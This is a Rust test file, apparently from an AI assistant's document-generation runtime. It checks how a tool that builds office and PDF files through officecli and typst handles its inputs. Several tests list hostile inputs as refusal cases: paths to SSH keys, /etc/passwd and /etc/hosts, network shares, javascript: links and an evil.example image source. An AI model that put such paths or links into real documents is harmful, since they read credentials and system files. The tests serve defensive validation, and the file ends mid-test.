        assert_eq!(result["file"]["mimeType"], PPTX);
        assert_eq!(result["file"]["name"], "Plan.pptx");
        assert_eq!(result["file"]["slides"], 3);
        assert_eq!(result["issues"], json!([]));
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        assert!(file.is_absolute() && file.is_file());
        let preview = PathBuf::from(result["previewPath"].as_str().unwrap());
        assert_eq!(preview.file_name().unwrap(), "preview-1.svg");
        assert!(preview.is_file());
        // officecli got the batch as the model wrote it.
        let seen: Value =
            serde_json::from_slice(&std::fs::read(file.with_file_name("batch-seen.json")).unwrap())
                .unwrap();
        assert_eq!(seen, deck());

        let record = f.record();
        let attachment = record
            .attachments
            .iter()
            .find(|a| a.origin.as_deref() == Some("generated"))
            .unwrap();
        assert_eq!(result["file"]["id"], attachment.id);
        assert_eq!(attachment.mime_type, PPTX);
        let reply = &record.messages[0];
        let generation = reply.media_for(Some("call-1")).unwrap();
        assert_eq!(generation.kind, "document");
        assert_eq!(generation.status, "completed");
        assert_eq!(generation.cost.as_deref(), Some("0"));
        assert_eq!(generation.outputs, vec![attachment.id.clone()]);
        assert_eq!(generation.params["format"], "pptx");
        assert_eq!(generation.params["slides"], 3);
        assert_eq!(generation.params["issues"], json!([]));
        let events = f.events("generation");
        assert_eq!(events.len(), 1);
        assert_eq!(events[0]["generation"]["kind"], "document");
        assert_eq!(events[0]["attachments"][0]["id"], attachment.id);
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn create_pptx_reports_batch_failures_without_attachment() {
        let f = fixture(
            Some(&officecli(
                r#"{"results":[{"index":0,"success":true},{"index":1,"success":false,"code":"invalid_path","output":"Slide 5 not found. Run `help batch` for the JSON item schema."}],"atomicRolledBack":true}"#,
                r#"{"issues":[]}"#,
                r#"{"slides":1}"#,
            )),
            None,
        );
        let error = f
            .call(
                "call-1",
                json!({"name": "deck", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap_err();
        assert_eq!(code(&error), FAILED);
        let failure = body(&error);
        assert_eq!(failure["items"][0]["index"], 1);
        assert_eq!(failure["items"][0]["code"], "invalid_path");
        assert_eq!(failure["items"][0]["output"], "Slide 5 not found.");
        assert!(failure["message"].as_str().unwrap().contains("1 of 2"));
        let record = f.record();
        assert!(record.attachments.is_empty());
        assert!(record.messages[0].generations.is_empty());
        assert!(f.events("generation").is_empty());
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn batch_failures_fit_the_runtime_error_text() {
        let failures: Vec<Value> = (0..9)
            .map(|index| json!({"index": index, "success": false, "error": "x".repeat(900), "code": "invalid_value"}))
            .collect();
        let batch = json!({"success": false, "data": {"results": failures, "summary": {"failed": 9, "atomicRolledBack": true}}});
        let f = fixture(Some(&officecli(&batch.to_string(), "{}", "{}")), None);
        let error = f
            .call(
                "call-1",
                json!({"name": "deck", "format": "docx", "content": deck()}),
            )
            .await
            .unwrap_err();
        // The runtime passes the model at most 2000 characters of it.
        assert!(error.chars().count() <= 2000, "{}", error.len());
        let failure = body(&error);
        let items = failure["items"].as_array().unwrap();
        assert_eq!(items.len(), 5);
        assert!(items
            .iter()
            .all(|item| item.to_string().chars().count() <= 300));
        assert!(failure["message"].as_str().unwrap().contains("9 of 9"));
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn batch_warnings_and_unsupported_properties_become_issues() {
        let batch = json!({"success": true, "data": {"results": [
            {"index": 0, "success": true, "output": "Added paragraph at /body/p[@paraId=1]",
             "warnings": [
                {"message": "style 'Heading1' was not defined in the styles part; added Word's built-in definition", "code": "advisory"},
                {"message": "[Schema] invalid child element", "code": "validation_error"},
             ]},
            {"index": 1, "success": true, "output": "Added shape at /slide[1]/shape[@id=100000]\nWARNING: UNSUPPORTED props: color (did you mean fill?). Run 'officecli help <format> <element>' to see valid props, or raw-set for raw XML."},
            {"index": 2, "success": true, "warning": "text was trimmed"},
        ], "summary": {"failed": 0}}});
        let f = fixture(Some(&officecli(&batch.to_string(), "{}", "{}")), None);
        let result = f
            .call(
                "call-1",
                json!({"name": "deck", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        let issues = result["issues"].as_array().unwrap();
        let messages: Vec<&str> = issues
            .iter()
            .map(|i| i["message"].as_str().unwrap())
            .collect();
        assert_eq!(
            messages,
            [
                "item 0: [Schema] invalid child element",
                "item 1: UNSUPPORTED props: color (did you mean fill?).",
                "item 2: text was trimmed",
            ]
        );
        assert!(issues.iter().all(|i| i["severity"] == "warning"));
        assert_eq!(issues[1]["path"], "/slide[1]/shape[@id=100000]");
        // The card keeps them too.
        let record = f.record();
        let generation = record.messages[0].media_for(Some("call-1")).unwrap();
        assert_eq!(generation.params["issues"], result["issues"]);
        assert_eq!(
            record.attachments[0].details.as_ref().unwrap()["issues"],
            result["issues"]
        );
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn repeated_advisories_collapse_and_errors_come_first() {
        let mut found: Vec<Value> = (0..14)
            .map(|i| json!({"severity": 1, "path": format!("/body/p[{i}]"), "message": "Body paragraph missing first-line indent"}))
            .collect();
        found.push(json!({"severity": 0, "path": "Sheet1!A1", "message": "Formula references missing sheet"}));
        let issues = json!({"success": true, "data": {"count": 15, "issues": found}});
        let f = fixture(
            Some(&officecli(
                r#"{"results":[{"index":0,"success":true}]}"#,
                &issues.to_string(),
                "{}",
            )),
            None,
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "memo", "format": "docx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(
            result["issues"],
            json!([
                {"severity": "error", "message": "Formula references missing sheet", "path": "Sheet1!A1"},
                {"severity": "warning", "message": "Body paragraph missing first-line indent (14 places)"},
            ])
        );
        // A Word file reports no count.
        assert!(result["file"].get("slides").is_none());
        assert!(result["file"].get("pages").is_none());
        assert!(result["previewPath"].is_null());
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn create_pdf_compiles_with_prelude_and_preview() {
        let f = fixture(None, Some(TYPST_OK));
        let body = "= Title\n\nHello.\n\n= Second\n\nMore.";
        let result = f
            .call(
                "call-1",
                json!({"name": "report.pdf", "format": "pdf", "content": body}),
            )
            .await
            .unwrap();
        assert_eq!(result["status"], "completed");
        assert_eq!(result["file"]["mimeType"], "application/pdf");
        assert_eq!(result["issues"], json!([]));
        // The runtime counts the pages for the model.
        assert!(result["file"].get("pages").is_none());
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        let main = std::fs::read_to_string(file.with_file_name("main.typ")).unwrap();
        let prelude = include_str!("pdf-prelude.typ").replace("{{LANG}}", "en");
        assert!(main.starts_with(&prelude));
        assert!(main.ends_with(body));
        assert!(main.contains(r#"lang: "en""#));
        let preview = PathBuf::from(result["previewPath"].as_str().unwrap());
        assert_eq!(preview.file_name().unwrap(), "preview-1.png");
        assert!(preview.is_file());
        // Packages cannot be fetched into the engine's folder, and the body
        // reads nothing outside the document's folder.
        assert!(!file.with_file_name("packages-writable").exists());
        let args = std::fs::read_to_string(file.with_file_name("typst-args")).unwrap();
        assert!(args
            .lines()
            .all(|line| line.starts_with("compile --root . --diagnostic-format short")));
        // The card counts the page dictionaries, not the page tree.
        let record = f.record();
        let generation = record.messages[0].media_for(Some("call-1")).unwrap();
        assert_eq!(generation.params["pages"], 2);
        assert_eq!(record.attachments[0].details.as_ref().unwrap()["pages"], 2);
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn create_pdf_returns_compiler_errors() {
        let f = fixture(
            None,
            Some("echo 'error: expected closing bracket' >&2; exit 1"),
        );
        let error = f
            .call(
                "call-1",
                json!({"name": "report", "format": "pdf", "content": "#text("}),
            )
            .await
            .unwrap_err();
        assert_eq!(code(&error), FAILED);
        assert!(error.contains("error: expected closing bracket"), "{error}");
        assert!(f.record().attachments.is_empty());
        assert!(f.events("generation").is_empty());
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn typst_lines_count_from_the_body_and_font_noise_is_dropped() {
        let prelude = include_str!("pdf-prelude.typ").lines().count();
        let script = format!(
            r#"for a; do last=$a; done
echo 'main.typ:2:16: warning: unknown font family: microsoft yahei' >&2
echo 'main.typ:{body2}:3: warning: unknown font family: comic sans' >&2
echo 'main.typ:{body3}:5: warning: block may not occur inside of a paragraph' >&2
case " $* " in
*" --format png "*) exit 0 ;;
*) printf '%%PDF-1.7 /Type /Page' > "$last" ;;
esac"#,
            body2 = prelude + 2,
            body3 = prelude + 3,
        );
        let f = fixture(None, Some(&script));
        let result = f
            .call(
                "call-1",
                json!({"name": "r", "format": "pdf", "content": "a\nb\nc"}),
            )
            .await
            .unwrap();
        assert_eq!(
            result["issues"],
            json!([{"severity": "warning", "message": "block may not occur inside of a paragraph", "path": "line 3, column 5"}])
        );
        // A first page that did not render leaves no preview.
        assert!(result["previewPath"].is_null());

        let script = format!(
            "echo 'main.typ:{}:7: error: unclosed delimiter' >&2; echo 'main.typ:1:1: error: in the prelude' >&2; exit 1",
            prelude + 2
        );
        let f = fixture(None, Some(&script));
        let error = f
            .call("call-1", json!({"name": "r", "format": "pdf", "content": "fine\n#text(fill: red)[open\nend"}))
            .await
            .unwrap_err();
        assert!(
            error
                .contains("line 2, column 7: error: unclosed delimiter\n    #text(fill: red)[open"),
            "{error}"
        );
        assert!(!error.contains(&format!("{}:", prelude + 2)), "{error}");
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn typst_packages_are_refused_before_compiling() {
        let f = fixture(None, Some("echo ran > ran; exit 1"));
        for body in [
            "#import \"@preview/cetz:0.3.0\": canvas\nHi",
            "#include  \"@local/notes:1.0.0\"",
            "#{ import \"@acme/x:1.0.0\" }",
            "see @preview/thing",
        ] {
            let error = f
                .call(
                    &id(),
                    json!({"name": "r", "format": "pdf", "content": body}),
                )
                .await
                .unwrap_err();
            assert_eq!(code(&error), FAILED, "{body}");
            assert!(error.contains("package"), "{error}");
        }
        assert!(f.outputs().iter().all(|dir| !dir.join("ran").exists()));
        // An address in the text is no import.
        let f = fixture(None, Some(TYPST_OK));
        f.call(
            "call-1",
            json!({"name": "r", "format": "pdf", "content": "Mail me at a\\@example.com"}),
        )
        .await
        .unwrap();
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn create_text_writes_directly() {
        // An engine that ran would leave a mark.
        let f = fixture(
            Some("echo ran > ran; exit 9"),
            Some("echo ran > ran; exit 9"),
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "notes.txt", "format": "md", "content": "# Notes\n\n- one\n"}),
            )
            .await
            .unwrap();
        assert_eq!(result["file"]["name"], "notes.md");
        assert_eq!(result["file"]["mimeType"], "text/markdown");
        assert_eq!(result["file"]["bytes"], 15);
        assert!(result["previewPath"].is_null());
        let record = f.record();
        let attachment = &record.attachments[0];
        assert_eq!(attachment.mime_type, "text/markdown");
        let copy = f
            .host
            .store(&identity().owner)
            .unwrap()
            .attachment_root(&f.sid)
            .unwrap()
            .join(&attachment.id);
        assert_eq!(std::fs::read(copy).unwrap(), b"# Notes\n\n- one\n");
        let generation = record.messages[0].media_for(Some("call-1")).unwrap();
        assert_eq!(
            generation.params,
            json!({"name": "notes.md", "format": "md", "issues": []})
        );
        assert!(f.outputs().iter().all(|dir| !dir.join("ran").exists()));
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn rejects_bad_names_and_oversized_content() {
        let f = fixture(None, None);
        let result = f
            .call(
                "call-1",
                json!({"name": "../x.pptx", "format": "csv", "content": "a,b\n"}),
            )
            .await
            .unwrap();
        assert_eq!(result["file"]["name"], "x.csv");
        let error = f
            .call(
                "call-2",
                json!({"name": "big", "format": "txt", "content": "x".repeat(2_200_000)}),
            )
            .await
            .unwrap_err();
        assert_eq!(code(&error), TOO_LARGE);
        // A refused document does not count against the reply.
        for call in ["call-3", "call-4"] {
            f.call(call, json!({"name": "n", "format": "txt", "content": "x"}))
                .await
                .unwrap();
        }
        let error = f
            .call(
                "call-5",
                json!({"name": "n", "format": "txt", "content": "x"}),
            )
            .await
            .unwrap_err();
        assert_eq!(code(&error), LIMIT);
        assert_eq!(f.record().attachments.len(), 3);
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn rejects_content_of_the_wrong_shape() {
        let f = fixture(Some("exit 9"), Some("exit 9"));
        for (args, why) in [
            (
                json!({"name": "a", "format": "pptx", "content": "text"}),
                "array",
            ),
            (
                json!({"name": "a", "format": "pdf", "content": []}),
                "string",
            ),
            (
                json!({"name": "a", "format": "json", "content": [{"command": "add"}]}),
                "string",
            ),
            (
                json!({"name": "a", "format": "docx", "content": [{"path": "/"}]}),
                "command",
            ),
            (
                json!({"name": "a", "format": "xlsx", "content": []}),
                "command",
            ),
            (
                json!({"name": "a", "format": "xlsx", "content": vec![json!({"command": "set"}); 2001]}),
                "2000",
            ),
            (
                json!({"name": "a", "format": "rtf", "content": "x"}),
                "malformed",
            ),
            (
                json!({"name": "a", "format": "txt", "content": "x", "extra": 1}),
                "malformed",
            ),
        ] {
            let error = f.call(&id(), args.clone()).await.unwrap_err();
            assert_eq!(code(&error), FAILED, "{args}");
            assert!(error.contains(why), "{error}");
        }
        assert!(f.outputs().is_empty());
    }

    /// Each of `items` alone as a pptx batch: its refusal.
    async fn refused(f: &Fixture, items: &[Value]) -> Vec<String> {
        let mut errors = vec![];
        for item in items {
            let content = json!([{"command": "add", "parent": "/", "type": "slide"}, item]);
            let error = f
                .call(
                    &id(),
                    json!({"name": "a", "format": "pptx", "content": content}),
                )
                .await
                .unwrap_err();
            assert_eq!(code(&error), FAILED, "{item}");
            assert!(error.contains("item 1:"), "{error}");
            errors.push(error);
        }
        errors
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn batches_hold_only_commands_that_change_the_document() {
        let f = fixture(Some("echo ran > ran; exit 9"), None);
        let errors = refused(
            &f,
            &[
                json!({"command": "raw-set", "part": "/document", "xpath": "//w:body", "action": "append", "xml": "<x/>"}),
                json!({"command": "add-part", "parent": "/"}),
                json!({"command": "raw", "part": "/document"}),
                json!({"command": "dump", "path": "/"}),
                json!({"command": "view", "mode": "screenshot"}),
                json!({"command": "validate"}),
                json!({"command": "get", "path": "/"}),
                json!({"command": "query", "selector": "shape"}),
                json!({"command": "import", "parent": "/Sheet1", "text": "a,b"}),
                json!({"op": "VIEW", "mode": "html"}),
                json!({"command": "add", "op": "remove", "parent": "/"}),
            ],
        )
        .await;
        assert!(
            errors[0].contains("\"raw-set\" is not available"),
            "{}",
            errors[0]
        );
        let errors = refused(
            &f,
            &[
                json!({"command": "add", "parent": "/", "type": "slide", "xml": "<p:sld/>"}),
                json!({"command": "set", "path": "/slide[1]", "text": "x"}),
            ],
        )
        .await;
        assert!(errors[0].contains("unknown field \"xml\""), "{}", errors[0]);
        // officecli's alias and each command's own fields are fine.
        let f = fixture(
            Some(&officecli(
                r#"{"results":[{"index":0,"success":true}]}"#,
                "{}",
                "{}",
            )),
            None,
        );
        let content = json!([
            {"op": "add", "parent": "/", "type": "slide", "index": 0},
            {"command": "move", "path": "/slide[1]/shape[1]", "to": "/slide[2]", "after": "/slide[2]/shape[1]"},
            {"command": "swap", "path": "/slide[1]", "path2": "/slide[2]"},
            {"command": "remove", "path": "/slide[3]"},
            {"command": "add", "parent": "/slide[1]", "type": "shape", "from": "/slide[1]/shape[2]", "before": "p[@paraId=1A2B3C4D]"},
            {"command": "set", "path": "/Sheet1/A1", "props": {"value": "1"}},
        ]);
        f.call(
            "call-1",
            json!({"name": "a", "format": "pptx", "content": content}),
        )
        .await
        .unwrap();
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn batch_items_cannot_reach_outside_the_document() {
        let f = fixture(Some("echo ran > ran; exit 9"), None);
        let picture = |src: &str| json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"src": src}});
        let shape = |props: Value| json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": props});
        let mut items: Vec<Value> = [
            // A file property takes a data URI and nothing else.
            "/Users/me/.ssh/id_rsa",
            "~/Pictures/me.png",
            "../../../secret.png",
            "secret.png",
            "C:\\x",
            "C:photo.jpg",
            "file:\\\\x",
            "file:///etc/passwd",
            "\\\\server\\share\\x.png",
            "/Windows/System32/x",
            "/ProgramData/x",
            "https://example.com/x.png",
            "javascript:alert(1)",
            "ms-word:ofe|u|https://example.com/x.docx",
            "data:text/plain,not-base64",
            "data:;base64,AAAA",
        ]
        .iter()
        .map(|src| picture(src))
        .collect();
        items.extend([
            json!({"command": "add", "parent": "/slide[1]", "type": "ole", "props": {"path": "/etc/hosts"}}),
            shape(json!({"fill": {"image": {"src": "/tmp/x.png"}}})),
            shape(json!({"logo": "data-free.png"})),
            shape(json!({"fill.image": "/Users/me/x.png"})),
            shape(json!({"subtitle": "/Users/me/x"})),
            shape(json!({"font.color": "~/x"})),
            shape(json!({"numberformat": "file:x"})),
            shape(json!({"x": "C:x"})),
            shape(json!({"link": "notes.txt"})),
            json!({"command": "add", "parent": "/", "type": "table", "props": {"data": "/Users/x/t.csv"}}),
            // A link takes a web or mail address.
            shape(json!({"link": "javascript:alert(1)"})),
            shape(json!({"link": "file:///etc/passwd"})),
            shape(json!({"hyperlink": "ms-word:ofe|u|x"})),
            shape(json!({"url": "/etc/hosts"})),
            // Any other property names no file and no address.
            shape(json!({"styles": ["plain", "/Volumes/USB/x.png"]})),
            shape(json!({"custom": "C:\\x"})),
            shape(json!({"custom": "file:\\\\x"})),
            shape(json!({"custom": "\\\\server\\share"})),
            shape(json!({"custom": "a\\..\\..\\x"})),
            shape(json!({"custom": ".hidden"})),
            shape(json!({"custom": "javascript:void(0)"})),
            shape(json!({"background": "image:/Users/me/x.png"})),
            json!({"command": "add", "parent": "/slide[1]", "type": "file:///etc/hosts"}),
            // An element field names an element.
            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "from": "C:\\x"}),
            json!({"command": "move", "path": "/slide[1]/shape[1]", "to": "../../x"}),
            json!({"command": "add", "parent": "//server/share", "type": "shape"}),
            json!({"command": "add", "parent": "\\\\server\\share", "type": "shape"}),
            json!({"command": "set", "path": "/Users/me/.ssh/id_rsa", "props": {"value": "1"}}),
            json!({"command": "add", "parent": "~/x", "type": "shape"}),
            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "from": "/Windows/System32/x"}),
            json!({"command": "add", "parent": "/ProgramData/x", "type": "shape"}),
            json!({"command": "set", "path": "/Users/x", "props": {"value": "1"}}),
            json!({"command": "set", "path": "/Q3 Sales/A1", "props": {"value": "1"}}),
            json!({"command": "set", "path": "/slide[1]/shape[@name=C:x]", "props": {"bold": "true"}}),
            json!({"command": "set", "path": "/slide[1]/shape[@name=\"a/b\"]", "props": {"bold": "true"}}),
            json!({"command": "set", "path": "file:///etc/hosts", "props": {"value": "1"}}),
            json!({"command": "set", "path": "javascript:x", "props": {"value": "1"}}),
            json!({"command": "set", "path": "/slide[1]/", "props": {"value": "1"}}),
        ]);
        let errors = refused(&f, &items).await;
        assert!(
            errors[0].contains("\"props.src\" must be a data: URI"),
            "{}",
            errors[0]
        );
        let at = |needle: &str| {
            errors
                .iter()
                .find(|error| error.contains(needle))
                .unwrap_or_else(|| panic!("no refusal names {needle}"))
        };
        at("\"props.fill\" must be a single value");
        at("\"props.link\" must be an https:, http: or mailto: address, or slide[n]");
        at("\"props.fill.image\" must be a data: URI");
        at("\"props.subtitle\" names a file or an address");
        at("\"props.styles\" must be a single value");
        at("\"props.background\" may name an image only as a data: URI");
        at("\"props.data\" must be the table's rows inline");
        at("\"from\" must name an element of the document");
        at("\"to\" must name an element of the document");
        assert!(f.outputs().iter().all(|dir| !dir.join("ran").exists()));
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn data_uris_links_and_text_with_addresses_are_fine() {
        let f = fixture(
            Some(&officecli(
                r#"{"results":[{"index":0,"success":true}]}"#,
                "{}",
                "{}",
            )),
            None,
        );
        let content = json!([
            {"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"src": "data:image/png;base64,iVBORw0KGgo=", "alt": "Logo", "link": "https://example.com"}},
            {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"text": "see https://example.com and a/b", "title": "MS-DOS: C:\\ and /usr/bin", "notes": "~/draft, ../old", "hyperlink": "mailto:team@example.com", "background": "FF0000-0000FF-90", "fill": "accent1"}},
            {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"link": "slide[3]", "text": "Next"}},
            {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"link": "/slide[3]", "text": "Next"}},
            {"command": "set", "path": "/Sheet1/B2", "props": {"formula": "=SUM(A1:A3)", "numberformat": "0.00%", "merge": "A1:C1", "anchor": "E2:L18", "value": "12:30", "font.color": "1F4E79"}},
            {"command": "add", "parent": "/", "type": "sheet", "props": {"name": "Q3 Sales"}},
            {"command": "set", "path": "/Q3 Sales/A1", "props": {"value": "1"}},
            {"command": "set", "path": "/slide[1]/shape[@name=\"My Title\"]", "props": {"bold": "true"}},
            {"command": "set", "path": "Sheet1!A1", "props": {"value": "x"}},
            {"command": "add", "parent": "/body", "type": "paragraph", "after": "find:Summary", "props": {"text": "x"}},
            {"command": "add", "parent": "/", "type": "table", "props": {"data": "Name,Cost;Hosting,1200"}},
            {"command": "add", "parent": "/", "type": "table", "props": {"data": "Name,Score\nAlice,90"}},
            {"command": "add", "parent": "/", "type": "table", "props": {"data": "a:b,c"}},
            // Gradients, image fills, number formats and lengths in their
            // own syntax.
            {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"fill": "linear:FF0000-0000FF-90", "gradient": "radial:FF0000-0000FF", "background": "image:data:image/png;base64,iVBORw0KGgo=", "x": ".5in", "y": "-2pt", "width": "0.5cm", "link": "/slide[3]/shape[@name=Title]"}},
            {"command": "set", "path": "/Sheet1/C1", "props": {"numberformat": "hh:mm", "font.numFmt": "[h]:mm:ss", "format": "yyyy-mm-dd hh:mm"}},
        ]);
        let result = f
            .call(
                "call-1",
                json!({"name": "a", "format": "pptx", "content": content}),
            )
            .await
            .unwrap();
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        let seen: Value =
            serde_json::from_slice(&std::fs::read(file.with_file_name("batch-seen.json")).unwrap())
                .unwrap();
        assert_eq!(seen, content);
    }

    /// Every batch command the bundled office skills teach (a snapshot of
    /// `assistant-runtime/skills/ofox-office-*`) passes the checks.
    #[test]
    fn the_skills_examples_pass_the_batch_checks() {
        let mut commands: Vec<Value> =
            serde_json::from_str(include_str!("testdata/skill-batches.json")).unwrap();
        assert!(commands.len() > 100);
        check_batch(&mut commands).unwrap();
    }

    #[test]
    fn elements_are_named_as_officecli_names_them() {
        let sheets = [
            "sheet1".to_owned(),
            "销售".to_owned(),
            "q3 sales".to_owned(),
        ];
        for path in [
            "/",
            "/body",
            "/body/p[last()]",
            "/body/tbl[last()]/tr[1]/tc[2]",
            "/body/p[@paraId=00100000]",
            "/header[1]",
            "/styles",
            "/theme",
            "/notes",
            "/slide[1]",
            "/slide[1]/placeholder[title]",
            "/slideMaster[1]/slideLayout[2]",
            "/slide[1]/table[@name=Plan]/tr[1]",
            "/slide[1]/shape[@id=100000]",
            "/slide[1]/shape[@name=\"My Title\"]",
            "/slide[1]/shape[@name='Q3 plan']",
            "/Sheet1/A1",
            "/Sheet1/A1:C3",
            "/Sheet1/col[A]",
            "/Sheet1/row[2]",
            "/Sheet1/chart[1]",
            "/Sheet1/tbl[1]",
            "/Sheet1",
            "/sheet[2]/A1",
            "/销售/B3:B9",
            "/Q3 Sales/A1",
            "shape",
            "p[@paraId=1A2B3C4D]",
            "Sheet1!A1",
            "1",
            "slide[3]",
            "nextslide",
        ] {
            assert!(names_an_element(path, false, &sheets), "{path}");
        }
        assert!(names_an_element("find:Revenue grew", true, &sheets));
        for path in [
            "",
            "//server/share",
            "\\\\server\\share",
            "/slide[1]/",
            "/slide[1]//shape",
            "/Users/me/.ssh/id_rsa",
            "/Users/x",
            "/etc/hosts",
            "/Windows/System32/x",
            "/ProgramData/x",
            "/Data/A1",
            "/../etc",
            "/slide[1]/..",
            "/slide[1",
            "/slide[1]]",
            "/slide[1]x",
            "/slide[1]x[2]",
            "/-x",
            "~/x",
            "../x",
            "./x",
            "C:\\x",
            "C:x",
            "file:///x",
            "javascript:x",
            "find:x",
            "a/b",
            "/slide[1]/shape[@name=C:x]",
            "/slide[1]/shape[@name=\"a/b\"]",
            "/slide[1]/shape[@name=\"a:b\"]",
            "/slide[1]/shape[@name=\"open]",
            "/slide[1]/shape[a/b]",
            "p[#x]",
            "/Sheet1/x",
            "/Sheet1/secret",
            "/q3 sales/x",
        ] {
            assert!(!names_an_element(path, false, &sheets), "{path}");
        }
    }

    #[test]
    fn sheets_made_by_the_batch_root_only_cells_and_ranges() {
        let batch = |name: &str, path: &str| {
            let mut commands = vec![
                json!({"command": "add", "parent": "/", "type": "sheet", "props": {"name": name}}),
                json!({"command": "set", "path": path, "props": {"value": "1"}}),
            ];
            check_batch(&mut commands)
        };
        assert!(batch("Users", "/Users/x/secret.txt").is_err());
        // A file system's folder name roots nothing, even as a sheet.
        assert!(batch("Users", "/Users/A1").is_err());
        assert!(batch("Program Files", "/Program Files/A1").is_err());
        for name in ["nix", "snap", "sbin", "lib", "cores"] {
            assert!(batch(name, &format!("/{name}/A1")).is_err(), "{name}");
        }
        assert!(batch("Sales", "/Sales/A1:C3").is_ok());
        assert!(batch("Sales", "/Sales/row[2]").is_ok());
        assert!(batch("Sales", "/Sales/chart[1]").is_ok());
        assert!(batch("Sales", "/Sales").is_ok());
        assert!(batch("Sales", "/Sales/x").is_err());
        assert!(batch("Sales", "/Sales/secret.txt").is_err());
        // A rename makes a sheet too.
        let mut commands = vec![
            json!({"command": "set", "path": "/Sheet1", "props": {"name": "Data"}}),
            json!({"command": "set", "path": "/Data/B2", "props": {"value": "1"}}),
        ];
        check_batch(&mut commands).unwrap();
    }

    #[test]
    fn each_property_takes_its_own_syntax() {
        let refused = |key: &str, text: &str| refused_value(text, property(key)).is_some();
        // Links: web and mail addresses, or a slide.
        for target in [
            "https://example.com",
            "mailto:a@example.com",
            "slide[3]",
            "/slide[3]",
            "/slide[2]/shape[@name=Title]",
        ] {
            assert!(!refused("link", target), "{target}");
        }
        for target in [
            "notes.txt",
            "body",
            "nextslide",
            "/body/p[1]",
            "slide[x]",
            "javascript:x",
            "file:///x",
        ] {
            assert!(refused("hyperlink", target), "{target}");
        }
        // Table data: rows inline, never a file or an address.
        for data in [
            "Name,Score\nAlice,90",
            "a:b,c",
            "H1,H2;R1C1,R1C2",
            "Total",
            "https,x",
        ] {
            assert!(!refused("data", data), "{data}");
        }
        for data in [
            "/Users/x/t.csv",
            "https://x/t.csv",
            "https://x/t.csv,extra",
            "@t.csv",
            "C:\\t.csv",
            "C:t.csv",
            "~/t.csv",
            ".t.csv",
            "\\\\server\\t.csv",
            "file:t.csv",
            "x/../../t.csv",
        ] {
            assert!(refused("data", data), "{data}");
        }
        // Fills: colours, gradients, an image as a data URI.
        for fill in [
            "FF0000",
            "accent1",
            "linear:FF0000-0000FF-90",
            "radial:FF0000-0000FF",
            "image:data:image/png;base64,iVBORw0KGgo=",
        ] {
            assert!(!refused("fill", fill), "{fill}");
            assert!(!refused("background", fill), "{fill}");
            assert!(!refused("shape.fill", fill), "{fill}");
        }
        for fill in [
            "image:/Users/x.png",
            "image:https://x/y.png",
            "linear:/Users/x",
            "radial:",
            "path:/x",
            "/x.png",
        ] {
            assert!(refused("fill", fill), "{fill}");
        }
        // Number formats keep their colons.
        for format in [
            "hh:mm",
            "[h]:mm:ss",
            "yyyy-mm-dd hh:mm",
            "0.00%",
            "#,##0.00",
        ] {
            assert!(!refused("numberformat", format), "{format}");
            assert!(!refused("numFmt", format), "{format}");
        }
        // Every other location check holds for them (R41).
        for format in [
            "\\$#,##0",
            "C:\\x",
            "C:x",
            "\\\\server\\x",
            "../x",
            "/x",
            "~/x",
            "file:x",
            "https://x",
            "javascript:x",
        ] {
            assert!(refused("numberformat", format), "{format}");
        }
        // Only those two keys: `format` is like any other.
        assert!(refused("format", "hh:mm"));
        assert!(refused("format", "file:///x"));
        // Lengths and numbers may start with a dot or a minus; a hidden
        // file may not.
        for length in [".5in", "-2pt", "0.5cm", "-.25", "E2:L18"] {
            assert!(!refused("x", length), "{length}");
        }
        for value in [".hidden", "./x", "/x", "~x", "C:x", "smb:x"] {
            assert!(refused("x", value), "{value}");
        }
    }

    /// One batch of `items` after a slide: its checks' answer.
    fn checked(items: &[Value]) -> Result<(), String> {
        let mut commands = vec![json!({"command": "add", "parent": "/", "type": "slide"})];
        commands.extend(items.iter().cloned());
        check_batch(&mut commands)
    }

    /// The bypasses a review found against the real officecli (fix round 1):
    /// each must be refused before officecli runs.
    #[test]
    fn props_are_one_object_of_single_values() {
        for item in [
            // officecli also takes `["key=value"]` arrays.
            json!({"command": "add", "parent": "/slide[1]", "type": "table", "props": ["data=/etc/hosts"]}),
            json!({"command": "add", "parent": "/body", "type": "markdown", "props": ["src=/Users/me/.ssh/id_rsa"]}),
            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": ["src=https://evil.example/x.png"]}),
            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": ["src=C:\\Users\\me\\.ssh\\id_rsa"]}),
            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": "src=/etc/hosts"}),
            // Nested objects and arrays.
            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"image": {"text": "/Users/x/.ssh/id_rsa"}}}),
            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"fill": {"image": {"src": "/tmp/x.png"}}}}),
            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"text": ["a", "b"]}}),
